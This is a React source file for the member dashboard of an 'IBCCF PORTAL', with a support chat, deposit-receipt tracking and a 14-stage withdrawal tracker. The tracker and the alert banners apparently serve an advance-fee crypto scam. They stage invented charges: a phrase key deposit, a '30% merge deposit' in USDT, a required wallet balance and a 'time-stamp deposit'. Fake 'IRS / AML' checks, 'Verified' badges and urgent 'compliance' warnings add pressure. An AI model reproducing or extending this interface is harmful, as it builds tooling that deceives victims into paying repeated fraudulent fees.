import { useState, useRef, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { useTheme } from "@/App";
import { useToast } from "@/hooks/use-toast";
import { usePortal } from "./PortalContext";
import { 
  Shield, ShieldCheck, Lock, CheckCircle, CheckCircle2, AlertTriangle, Clock, 
  Bell, FileText, MessageCircle, Send, X, Wallet, ExternalLink, User, History,
  Moon, Sun, TrendingUp, Key, Users, LogOut
} from "lucide-react";
import { Link } from "wouter";

export function DashboardView() {
  const { 
    currentCase, adminMessages, submissions, depositReceipts, 
    chatMessages, unreadCount, unreadAdminMessages, isChatOpen, setIsChatOpen,
    sendMessage, setViewState, logout, hasUrgentMessages
  } = usePortal();
  
  const [newMessage, setNewMessage] = useState("");
  const [isSendingMessage, setIsSendingMessage] = useState(false);
  const [isFeedbackOpen, setIsFeedbackOpen] = useState(false);
  const [feedbackRating, setFeedbackRating] = useState(0);
  const [feedbackComment, setFeedbackComment] = useState("");
  const [isSubmittingFeedback, setIsSubmittingFeedback] = useState(false);
  const [hasSubmittedFeedback, setHasSubmittedFeedback] = useState(false);
  
  const chatScrollRef = useRef<HTMLDivElement>(null);
  const { theme, toggleTheme } = useTheme();
  const { toast } = useToast();

  const urgentMessages = adminMessages.filter(m => m.category === 'urgent');
  const processingMessages = adminMessages.filter(m => m.category === 'processing');
  const resolvedMessages = adminMessages.filter(m => m.category === 'resolved');

  useEffect(() => {
    if (chatScrollRef.current) {
      chatScrollRef.current.scrollTop = chatScrollRef.current.scrollHeight;
    }
  }, [chatMessages, isChatOpen]);

  useEffect(() => {
    if (isChatOpen && currentCase && unreadCount > 0) {
      fetch(`/api/cases/${currentCase.id}/messages/read`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sender: 'admin' })
      });
    }
  }, [isChatOpen, currentCase, unreadCount]);

  const handleSendMessage = async () => {
    if (!newMessage.trim() || isSendingMessage) return;
    setIsSendingMessage(true);
    await sendMessage(newMessage.trim());
    setNewMessage("");
    setIsSendingMessage(false);
  };

  const submitFeedback = async () => {
    if (!currentCase || feedbackRating === 0) return;
    
    setIsSubmittingFeedback(true);
    try {
      const res = await fetch('/api/user-feedback', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          caseId: currentCase.id,
          rating: feedbackRating,
          comment: feedbackComment.trim() || null,
          category: 'general'
        })
      });
      
      if (res.ok) {
        setHasSubmittedFeedback(true);
        setIsFeedbackOpen(false);
        setFeedbackRating(0);
        setFeedbackComment("");
        toast({
          title: "Feedback Submitted",
          description: "Thank you for your feedback!",
          className: "bg-green-50 border-green-200 text-green-900",
        });
      }
    } catch {
      toast({ variant: "destructive", title: "Error", description: "Failed to submit feedback." });
    }
    setIsSubmittingFeedback(false);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50/30 to-slate-50">
      <nav className="bg-gradient-to-r from-slate-900 via-blue-900 to-slate-900 text-white shadow-2xl relative overflow-hidden">
        <div className="absolute inset-0 bg-[linear-gradient(to_right,transparent,rgba(255,255,255,0.05),transparent)]"></div>
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 relative">
          <div className="flex justify-between items-center">
            <div className="flex items-center gap-2 sm:gap-4">
              <div className="relative">
                <div className="absolute inset-0 bg-blue-500 blur-lg opacity-50 rounded-full"></div>
                <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-full bg-white/20 flex items-center justify-center relative">
                  <Shield className="h-5 w-5 sm:h-7 sm:w-7 text-white" />
                </div>
              </div>
              <div>
                <h1 className="font-bold text-sm sm:text-lg tracking-wide">IBCCF PORTAL</h1>
                <div className="flex items-center gap-2">
                  <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
                  <p className="text-[10px] sm:text-xs text-blue-200 uppercase tracking-wider hidden sm:block">Member Dashboard</p>
                </div>
              </div>
            </div>
            <div className="flex items-center gap-2 sm:gap-4">
              {hasUrgentMessages && (
                <motion.div 
                  animate={{ scale: [1, 1.05, 1] }}
                  transition={{ repeat: Infinity, duration: 2 }}
                  className="flex items-center gap-1 sm:gap-2 bg-gradient-to-r from-red-500 to-red-600 px-2 sm:px-4 py-1 sm:py-1.5 rounded-full text-xs sm:text-sm font-bold shadow-lg"
                >
                  <AlertTriangle className="w-3 h-3 sm:w-4 sm:h-4" />
                  <span className="hidden sm:inline">URGENT</span>
                </motion.div>
              )}
              <Button
                variant="ghost"
                size="sm"
                className="text-white hover:bg-white/10 border border-white/20 hover:border-white/40 transition-all p-2 sm:p-2"
                onClick={toggleTheme}
                data-testid="button-theme-toggle"
              >
                {theme === 'dark' ? <Sun className="w-4 h-4" /> : <Moon className="w-4 h-4" />}
              </Button>
              <Button 
                variant="ghost" 
                size="sm" 
                className="text-white hover:bg-white/10 border border-white/20 hover:border-white/40 transition-all text-xs sm:text-sm px-2 sm:px-3"
                onClick={logout}
                data-testid="button-logout"
              >
                <span className="hidden sm:inline">Sign Out</span>
                <LogOut className="w-4 h-4 sm:hidden" />
              </Button>
            </div>
          </div>
        </div>
      </nav>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="mb-6 sm:mb-8">
          <div className="flex flex-col gap-4">
            <div>
              <h2 className="text-xl sm:text-2xl md:text-3xl font-bold text-slate-900 mb-1">
                Welcome back, <span className="bg-gradient-to-r from-blue-600 to-blue-800 bg-clip-text text-transparent">{currentCase?.userName || 'Member'}</span>
              </h2>
              <div className="flex flex-wrap items-center gap-2 sm:gap-3 text-slate-600 text-sm">
                <span className="flex items-center gap-1.5">
                  <ShieldCheck className="w-4 h-4 text-green-500" />
                  Verified
                </span>
                <span className="text-slate-300 hidden sm:inline">•</span>
                <span className="font-mono text-xs sm:text-sm">IBCCF-{currentCase?.accessCode}</span>
              </div>
            </div>
            <div className="flex items-center gap-2 sm:gap-3">
              <div className="bg-white rounded-lg shadow-sm border border-slate-200 px-3 sm:px-4 py-2 text-center flex-1 sm:flex-none">
                <p className="text-[10px] sm:text-xs text-slate-500 uppercase tracking-wider">VIP Status</p>
                <p className="font-bold text-blue-600 text-sm sm:text-base">{currentCase?.vipStatus || 'Standard'}</p>
              </div>
              <div className="bg-white rounded-lg shadow-sm border border-slate-200 px-3 sm:px-4 py-2 text-center flex-1 sm:flex-none">
                <p className="text-[10px] sm:text-xs text-slate-500 uppercase tracking-wider">Account</p>
                <p className="font-bold text-green-600 text-sm sm:text-base">Active</p>
              </div>
            </div>
          </div>
        </motion.div>

        {currentCase?.showWithdrawalProgress && (
          <WithdrawalProgressTracker currentCase={currentCase} />
        )}

        {(currentCase?.hasRequirements || hasUrgentMessages) && (
          <motion.div 
            initial={{ opacity: 0, scale: 0.95 }} 
            animate={{ opacity: 1, scale: 1 }}
            className="mb-6 sm:mb-8 p-3 sm:p-5 bg-gradient-to-r from-red-50 to-orange-50 border-2 border-red-200 rounded-xl flex flex-col sm:flex-row items-start sm:items-center gap-3 sm:gap-4 shadow-lg shadow-red-100/50"
          >
            <motion.div 
              animate={{ rotate: [0, -10, 10, -10, 0] }}
              transition={{ repeat: Infinity, duration: 2, ease: "easeInOut" }}
              className="w-10 h-10 sm:w-14 sm:h-14 bg-gradient-to-br from-red-500 to-orange-500 rounded-full flex items-center justify-center flex-shrink-0 shadow-lg"
            >
              <AlertTriangle className="w-5 h-5 sm:w-7 sm:h-7 text-white" />
            </motion.div>
            <div className="flex-1">
              <h3 className="font-bold text-red-900 text-base sm:text-lg">Immediate Action Required</h3>
              <p className="text-red-700 text-sm sm:text-base">You have pending requirements from IBCCF compliance team.</p>
            </div>
            <Button className="bg-red-600 hover:bg-red-700 shadow-lg w-full sm:w-auto" size="sm" onClick={() => setViewState('messages')}>
              View Now
            </Button>
          </motion.div>
        )}

        <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6">
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
            <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('messages')} data-testid="card-required-actions">
              <CardHeader className="bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-t-lg">
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2">
                    <Bell className="w-5 h-5" />
                    Required Actions
                  </CardTitle>
                  {unreadAdminMessages > 0 && (
                    <Badge className="bg-red-500 text-white animate-pulse">{unreadAdminMessages}</Badge>
                  )}
                </div>
              </CardHeader>
              <CardContent className="pt-6">
                <div className="space-y-3">
                  <div className="flex items-center justify-between text-sm">
                    <span className="flex items-center gap-2 text-red-600"><AlertTriangle className="w-4 h-4" /> Urgent</span>
                    <Badge variant={urgentMessages.length > 0 ? "destructive" : "secondary"}>{urgentMessages.length}</Badge>
                  </div>
                  <div className="flex items-center justify-between text-sm">
                    <span className="flex items-center gap-2 text-amber-600"><Clock className="w-4 h-4" /> Processing</span>
                    <Badge variant="outline">{processingMessages.length}</Badge>
                  </div>
                  <div className="flex items-center justify-between text-sm">
                    <span className="flex items-center gap-2 text-green-600"><CheckCircle className="w-4 h-4" /> Resolved</span>
                    <Badge variant="outline">{resolvedMessages.length}</Badge>
                  </div>
                </div>
                <Button className="w-full mt-6" variant="outline">View Messages</Button>
              </CardContent>
            </Card>
          </motion.div>

          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
            <Card className={`h-full transition-shadow border-2 border-transparent ${currentCase?.letterSent ? 'hover:shadow-lg cursor-pointer hover:border-primary/20' : 'opacity-90'}`} onClick={() => setViewState('letter')} data-testid="card-withdrawal-letter">
              <CardHeader className={`text-white rounded-t-lg ${currentCase?.letterSent ? 'bg-gradient-to-r from-emerald-500 to-emerald-600' : 'bg-gradient-to-r from-slate-400 to-slate-500'}`}>
                <CardTitle className="flex items-center gap-2">
                  <FileText className="w-5 h-5" />
                  Withdrawal Letter
                  {!currentCase?.letterSent && <Badge className="bg-amber-500 text-white ml-2">Pending</Badge>}
                </CardTitle>
              </CardHeader>
              <CardContent className="pt-6">
                {currentCase?.letterSent ? (
                  <>
                    <p className="text-slate-600 text-sm mb-4">Review your withdrawal options and select your preferred method.</p>
                    <div className="space-y-2 text-sm">
                      <div className="flex justify-between">
                        <span className="text-slate-500">Status</span>
                        <Badge variant={submissions.length > 0 ? 'default' : 'outline'} className={submissions.length > 0 ? 'bg-green-600' : ''}>
                          {submissions.length > 0 ? 'Submitted' : 'Ready to Review'}
                        </Badge>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-slate-500">Submissions</span>
                        <span className="font-semibold">{submissions.length}</span>
                      </div>
                    </div>
                    <Button className="w-full mt-6" variant="outline">View Letter</Button>
                  </>
                ) : (
                  <>
                    <div className="flex items-center gap-3 mb-4 text-amber-600 bg-amber-50 rounded-lg p-3">
                      <Clock className="w-5 h-5" />
                      <p className="text-sm font-medium">Your letter is being prepared by the compliance team</p>
                    </div>
                    <p className="text-slate-500 text-sm">You will be notified when your personalized withdrawal letter is ready for review.</p>
                    <Button className="w-full mt-6" variant="outline" disabled>Awaiting Letter</Button>
                  </>
                )}
              </CardContent>
            </Card>
          </motion.div>

          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
            <Card className="h-full hover:shadow-lg transition-shadow border-2 border-transparent hover:border-primary/20">
              <CardHeader className="bg-gradient-to-r from-purple-500 to-purple-600 text-white rounded-t-lg">
                <CardTitle className="flex items-center gap-2"><User className="w-5 h-5" />Profile Information</CardTitle>
              </CardHeader>
              <CardContent className="pt-6">
                <div className="space-y-3 text-sm">
                  <div className="flex justify-between items-center">
                    <span className="text-slate-500">Name</span>
                    <span className="font-semibold">{currentCase?.userName}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-slate-500">Email</span>
                    <span className="font-semibold text-xs">{currentCase?.userEmail}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-slate-500">VIP Status</span>
                    <Badge className="bg-amber-100 text-amber-700">{currentCase?.vipStatus || 'Standard'}</Badge>
                  </div>
                  {currentCase?.depositAddress && (
                    <div className="pt-2 border-t">
                      <span className="text-slate-500 text-xs block mb-1">Deposit Address</span>
                      <code className="text-xs bg-slate-100 p-2 rounded block break-all">{currentCase.depositAddress}</code>
                    </div>
                  )}
                </div>
                {currentCase?.profileRedirectUrl && (
                  <Button className="w-full mt-6" variant="outline" onClick={() => window.open(currentCase.profileRedirectUrl, '_blank')}>
                    <ExternalLink className="w-4 h-4 mr-2" />Access my profile account
                  </Button>
                )}
              </CardContent>
            </Card>
          </motion.div>

          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.4 }}>
            <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('deposit')} data-testid="card-deposit">
              <CardHeader className="bg-gradient-to-r from-amber-500 to-amber-600 text-white rounded-t-lg">
                <CardTitle className="flex items-center gap-2"><Wallet className="w-5 h-5" />Deposit & Receipts</CardTitle>
              </CardHeader>
              <CardContent className="pt-6">
                <p className="text-slate-600 text-sm mb-4">Upload your deposit receipts and track their status.</p>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-slate-500">Receipts Uploaded</span>
                    <span className="font-semibold">{depositReceipts.length}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-500">Pending Review</span>
                    <span className="font-semibold">{depositReceipts.filter(r => r.status === 'pending').length}</span>
                  </div>
                </div>
                <Button className="w-full mt-6" variant="outline">Manage Deposits</Button>
              </CardContent>
            </Card>
          </motion.div>

          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.5 }}>
            <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('submissions')} data-testid="card-history">
              <CardHeader className="bg-gradient-to-r from-slate-600 to-slate-700 text-white rounded-t-lg">
                <CardTitle className="flex items-center gap-2"><History className="w-5 h-5" />Submission History</CardTitle>
              </CardHeader>
              <CardContent className="pt-6">
                <p className="text-slate-600 text-sm mb-4">View all your previous submissions and their status.</p>
                <div className="text-sm">
                  <div className="flex justify-between">
                    <span className="text-slate-500">Total Submissions</span>
                    <span className="font-semibold">{submissions.length}</span>
                  </div>
                </div>
                <Button className="w-full mt-6" variant="outline">View History</Button>
              </CardContent>
            </Card>
          </motion.div>

          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.6 }}>
            <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('timeline')} data-testid="card-timeline">
              <CardHeader className="bg-gradient-to-r from-indigo-500 to-indigo-600 text-white rounded-t-lg">
                <CardTitle className="flex items-center gap-2"><Clock className="w-5 h-5" />Activity Timeline</CardTitle>
              </CardHeader>
              <CardContent className="pt-6">
                <p className="text-slate-600 text-sm mb-4">View your complete account activity history.</p>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-slate-500">Recent Activities</span>
                    <span className="font-semibold">{submissions.length + depositReceipts.length + adminMessages.length}</span>
                  </div>
                </div>
                <Button className="w-full mt-6" variant="outline">View Timeline</Button>
              </CardContent>
            </Card>
          </motion.div>

          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.7 }}>
            <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setIsChatOpen(true)} data-testid="card-support">
              <CardHeader className="bg-gradient-to-r from-cyan-500 to-cyan-600 text-white rounded-t-lg">
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2"><MessageCircle className="w-5 h-5" />IBCCF Support</CardTitle>
                  {unreadCount > 0 && <Badge className="bg-red-500 text-white">{unreadCount}</Badge>}
                </div>
              </CardHeader>
              <CardContent className="pt-6">
                <p className="text-slate-600 text-sm mb-4">Chat with IBCCF support for assistance with your account.</p>
                <Button className="w-full mt-6" variant="outline"><MessageCircle className="w-4 h-4 mr-2" />Open Chat</Button>
              </CardContent>
            </Card>
          </motion.div>

          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.8 }}>
            <Card className={`h-full transition-shadow border-2 border-transparent ${hasSubmittedFeedback ? 'opacity-75' : 'hover:shadow-lg cursor-pointer hover:border-primary/20'}`} onClick={() => !hasSubmittedFeedback && setIsFeedbackOpen(true)} data-testid="card-feedback">
              <CardHeader className="bg-gradient-to-r from-pink-500 to-rose-500 text-white rounded-t-lg">
                <CardTitle className="flex items-center gap-2"><span className="text-xl">⭐</span>Feedback</CardTitle>
              </CardHeader>
              <CardContent className="pt-6">
                {hasSubmittedFeedback ? (
                  <div className="text-center text-green-600">
                    <CheckCircle className="w-8 h-8 mx-auto mb-2" />
                    <p className="text-sm font-medium">Thank you for your feedback!</p>
                  </div>
                ) : (
                  <>
                    <p className="text-slate-600 text-sm mb-4">Help us improve by sharing your experience.</p>
                    <Button className="w-full mt-6" variant="outline">Leave Feedback</Button>
                  </>
                )}
              </CardContent>
            </Card>
          </motion.div>

          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.9 }}>
            <Link href="/community">
              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" data-testid="card-community">
                <CardHeader className="bg-gradient-to-r from-violet-500 to-purple-600 text-white rounded-t-lg">
                  <CardTitle className="flex items-center gap-2"><Users className="w-5 h-5" />Community Forum</CardTitle>
                </CardHeader>
                <CardContent className="pt-6">
                  <p className="text-slate-600 text-sm mb-4">Connect with other community members, share experiences, and get support.</p>
                  <div className="space-y-2 text-sm mb-4">
                    <div className="flex items-center gap-2 text-slate-500">
                      <Users className="w-4 h-4" />
                      <span>650+ Active Members</span>
                    </div>
                    <div className="flex items-center gap-2 text-slate-500">
                      <MessageCircle className="w-4 h-4" />
                      <span>Department Discussions</span>
                    </div>
                  </div>
                  <Button className="w-full" variant="outline"><Users className="w-4 h-4 mr-2" />Join Community</Button>
                </CardContent>
              </Card>
            </Link>
          </motion.div>
        </div>
      </main>

      <motion.button
        initial={{ scale: 0 }}
        animate={{ scale: 1 }}
        whileHover={{ scale: 1.1 }}
        className="fixed bottom-6 right-6 w-16 h-16 bg-primary text-white rounded-full shadow-2xl flex items-center justify-center z-50"
        onClick={() => setIsChatOpen(true)}
        data-testid="button-chat-float"
      >
        <MessageCircle className="w-7 h-7" />
        {unreadCount > 0 && (
          <span className="absolute -top-1 -right-1 w-6 h-6 bg-red-500 rounded-full text-xs flex items-center justify-center font-bold">{unreadCount}</span>
        )}
      </motion.button>

      <AnimatePresence>
        {isChatOpen && currentCase && (
          <motion.div
            initial={{ opacity: 0, y: 100 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 100 }}
            className="fixed bottom-6 right-6 z-50 w-80 sm:w-96 h-[500px] bg-white rounded-lg shadow-2xl border border-slate-200 flex flex-col overflow-hidden"
            data-testid="chat-panel"
          >
            <div className="bg-gradient-to-r from-blue-600 to-blue-700 text-white px-4 py-3 flex justify-between items-center">
              <div className="flex items-center gap-3">
                <div className="relative">
                  <MessageCircle className="h-5 w-5" />
                  <span className="absolute -bottom-0.5 -right-0.5 w-2 h-2 bg-green-400 rounded-full border border-blue-600"></span>
                </div>
                <div>
                  <span className="font-semibold block">IBCCF Support</span>
                  <span className="text-xs text-blue-200">Online • Typically replies in minutes</span>
                </div>
              </div>
              <Button variant="ghost" size="sm" className="h-8 w-8 p-0 text-white hover:bg-blue-700" onClick={() => setIsChatOpen(false)} data-testid="button-close-chat">
                <X className="h-4 w-4" />
              </Button>
            </div>
            
            <div ref={chatScrollRef} className="flex-1 overflow-y-auto p-4 space-y-3 bg-slate-50">
              {chatMessages.length === 0 ? (
                <div className="text-center text-slate-500 mt-8">
                  <div className="w-16 h-16 bg-blue-100 rounded-full mx-auto flex items-center justify-center mb-4">
                    <MessageCircle className="h-8 w-8 text-blue-500" />
                  </div>
                  <p className="font-medium text-slate-700 mb-1">Welcome to IBCCF Support</p>
                  <p className="text-sm text-slate-500">How can we help you today?</p>
                </div>
              ) : (
                chatMessages.map((msg) => (
                  <div key={msg.id} className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
                    {msg.sender === 'admin' && (
                      <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center mr-2 flex-shrink-0">
                        <span className="text-blue-600 font-bold text-xs">IBCCF</span>
                      </div>
                    )}
                    <div className={`max-w-[75%] px-4 py-2.5 rounded-2xl shadow-sm ${msg.sender === 'user' ? 'bg-blue-600 text-white rounded-br-md' : 'bg-white text-slate-800 border border-slate-100 rounded-bl-md'}`}>
                      <p className="text-sm whitespace-pre-wrap leading-relaxed">{msg.message}</p>
                    </div>
                  </div>
                ))
              )}
            </div>
            
            <div className="p-3 border-t border-slate-200 bg-white">
              <div className="flex gap-2 items-end">
                <div className="flex-1">
                  <Input
                    placeholder="Type your message..."
                    value={newMessage}
                    onChange={(e) => setNewMessage(e.target.value)}
                    onKeyDown={(e) => e.key === 'Enter' && !e.shiftKey && handleSendMessage()}
                    disabled={isSendingMessage}
                    className="bg-slate-50 border-slate-200 focus:border-blue-500"
                    data-testid="input-chat-message"
                  />
                </div>
                <Button onClick={handleSendMessage} disabled={!newMessage.trim() || isSendingMessage} size="sm" className="h-10 w-10 p-0 bg-blue-600 hover:bg-blue-700 rounded-full" data-testid="button-send-message">
                  <Send className="h-4 w-4" />
                </Button>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      <Dialog open={isFeedbackOpen} onOpenChange={setIsFeedbackOpen}>
        <DialogContent className="sm:max-w-md" data-testid="dialog-feedback">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2"><span className="text-2xl">⭐</span>Share Your Feedback</DialogTitle>
            <DialogDescription>Help us improve your experience by rating our service and leaving comments.</DialogDescription>
          </DialogHeader>
          <div className="py-4 space-y-6">
            <div>
              <label className="text-sm font-medium mb-3 block">How would you rate your experience?</label>
              <div className="flex gap-2 justify-center">
                {[1, 2, 3, 4, 5].map((star) => (
                  <button key={star} type="button" className={`text-4xl transition-transform hover:scale-110 ${feedbackRating >= star ? 'text-yellow-400' : 'text-slate-300'}`} onClick={() => setFeedbackRating(star)} data-testid={`button-star-${star}`}>★</button>
                ))}
              </div>
              {feedbackRating > 0 && (
                <p className="text-center text-sm text-slate-500 mt-2">
                  {feedbackRating === 1 && "Poor"}{feedbackRating === 2 && "Fair"}{feedbackRating === 3 && "Good"}{feedbackRating === 4 && "Very Good"}{feedbackRating === 5 && "Excellent"}
                </p>
              )}
            </div>
            <div>
              <label className="text-sm font-medium mb-2 block">Additional comments (optional)</label>
              <Textarea placeholder="Tell us more about your experience..." value={feedbackComment} onChange={(e) => setFeedbackComment(e.target.value)} rows={4} className="resize-none" data-testid="input-feedback-comment" />
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setIsFeedbackOpen(false)}>Cancel</Button>
            <Button onClick={submitFeedback} disabled={feedbackRating === 0 || isSubmittingFeedback} className="bg-gradient-to-r from-pink-500 to-rose-500 hover:from-pink-600 hover:to-rose-600" data-testid="button-submit-feedback">
              {isSubmittingFeedback ? "Submitting..." : "Submit Feedback"}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}

function WithdrawalProgressTracker({ currentCase }: { currentCase: any }) {
  const stages = [
    { id: 1, label: "Phrase Key Deposit Received", icon: "💰", description: "Phrase key deposit successfully confirmed on ledger" },
    { id: 2, label: "Generating Secure Phrase Key", icon: "⚙️", description: "Phrase key creation underway" },
    { id: 3, label: "Phrase Key Approved & Available", icon: "🔐", description: "Phrase key approved and delivered to Secure Message Center" },
    { id: 4, label: "Withdrawal Process Initiated", icon: "🚀", description: "Withdrawal flow activated" },
    { id: 5, label: "Initial Deposit Verification", icon: "✅", description: "Deposit verification in progress" },
    { id: 6, label: "Phrase Key Verification", icon: "🔑", description: "Phrase key validation in progress" },
    { id: 7, label: "Phrase Key Merge Deposit Required", icon: "📊", description: currentCase?.phraseKeyMergeDeposit ? `Required: ${currentCase.phraseKeyMergeDeposit} (30% merge deposit)` : "Awaiting merge deposit calculation" },
    { id: 8, label: "Financial Department Verification", icon: "🏦", description: "Compliance and financial review" },
    { id: 9, label: "Mining Withdrawal for Final Clearance", icon: "⛏️", description: "Blockchain confirmation and internal clearance" },
    { id: 10, label: "Blockchain Activity Verification", icon: "🔗", description: currentCase?.activityWalletRequirement ? `Required: ${currentCase.activityWalletRequirement} balance in receiving wallet` : "Wallet activity verification in progress" },
    { id: 11, label: "IRS / International AML Verification", icon: "🏛️", description: "Regulatory compliance checks in progress" },
    { id: 12, label: "Final Withdrawal Processing", icon: "📋", description: "Preparing funds for release" },
    { id: 13, label: "Withdrawal Successfully Released", icon: "🎉", description: "Funds released to designated wallet" },
    { id: 14, label: "Time-Stamp Deposit for Final Delivery", icon: "⏰", description: "Final delivery confirmation" },
  ];
  
  const currentStage = parseInt(currentCase?.withdrawalStage || '1');
  const totalStages = 14;
  const completedStages = Math.max(0, currentStage - 1);
  const progressPercent = Math.round((completedStages / totalStages) * 100);

  return (
    <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="mb-8">
      <Card className="border-2 border-blue-200 shadow-lg overflow-hidden">
        <CardHeader className="bg-gradient-to-r from-blue-600 via-blue-700 to-indigo-700 text-white">
          <CardTitle className="flex items-center gap-3">
            <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center">
              <TrendingUp className="w-5 h-5" />
            </div>
            <div>
              <span className="text-lg font-bold">Withdrawal Progress</span>
              <p className="text-blue-200 text-sm font-normal">Real-time status of your withdrawal request</p>
            </div>
          </CardTitle>
        </CardHeader>
        <CardContent className="pt-6 pb-8 px-6">
          <div className="space-y-6">
            <div className="relative">
              <div className="flex justify-between mb-2">
                <span className="text-sm font-medium text-slate-600">Progress</span>
                <span className="text-sm font-bold text-blue-600">{progressPercent}%</span>
              </div>
              <div className="h-3 bg-slate-200 rounded-full overflow-hidden">
                <motion.div 
                  className="h-full bg-gradient-to-r from-blue-500 via-blue-600 to-indigo-600 rounded-full"
                  initial={{ width: 0 }}
                  animate={{ width: `${progressPercent}%` }}
                  transition={{ duration: 1, ease: "easeOut" }}
                />
              </div>
            </div>
            
            {(() => {
              const currentStageData = stages.find(s => s.id === currentStage);
              if (!currentStageData) return null;
              return (
                <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="p-4 bg-gradient-to-r from-blue-50 to-indigo-50 border-2 border-blue-300 rounded-xl">
                  <div className="flex items-center gap-3">
                    <div className="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center text-2xl animate-pulse">{currentStageData.icon}</div>
                    <div>
                      <p className="text-xs text-blue-600 font-medium">Currently Processing</p>
                      <h4 className="font-bold text-blue-800 text-lg">{currentStageData.label}</h4>
                      <p className="text-blue-600 text-sm mt-0.5">{currentStageData.description}</p>
                    </div>
                  </div>
                </motion.div>
              );
            })()}
            
            {currentStage === 7 && currentCase?.phraseKeyMergeDeposit && (
              <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="p-4 bg-gradient-to-r from-purple-50 to-indigo-50 border-2 border-purple-300 rounded-xl">
                <div className="flex items-start gap-3">
                  <div className="w-12 h-12 bg-purple-500 rounded-full flex items-center justify-center flex-shrink-0">
                    <Key className="w-6 h-6 text-white" />
                  </div>
                  <div>
                    <h4 className="font-bold text-purple-800 text-lg">Phrase Key Merge Deposit Required</h4>
                    <p className="text-purple-700 text-sm mt-1">A 30% merge deposit is required to complete the phrase key verification process.</p>
                    <div className="mt-3 p-3 bg-white rounded-lg border border-purple-200">
                      <p className="text-sm text-slate-600">Required Amount:</p>
                      <p className="text-2xl font-bold text-purple-600">{currentCase.phraseKeyMergeDeposit} USDT</p>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}
            
            {currentStage === 10 && currentCase?.activityWalletRequirement && (
              <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="p-4 bg-gradient-to-r from-amber-50 to-orange-50 border-2 border-amber-300 rounded-xl">
                <div className="flex items-start gap-3">
                  <div className="w-12 h-12 bg-amber-500 rounded-full flex items-center justify-center flex-shrink-0">
                    <Wallet className="w-6 h-6 text-white" />
                  </div>
                  <div>
                    <h4 className="font-bold text-amber-800 text-lg">Blockchain Activity Verification</h4>
                    <p className="text-amber-700 text-sm mt-1">Please maintain the required USDT balance in your receiving wallet address for activity verification.</p>
                    <div className="mt-3 p-3 bg-white rounded-lg border border-amber-200">
                      <p className="text-sm text-slate-600">Required Wallet Balance:</p>
                      <p className="text-2xl font-bold text-amber-600">{currentCase.activityWalletRequirement} USDT</p>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}
          </div>
        </CardContent>
      </Card>
    </motion.div>
  );
}
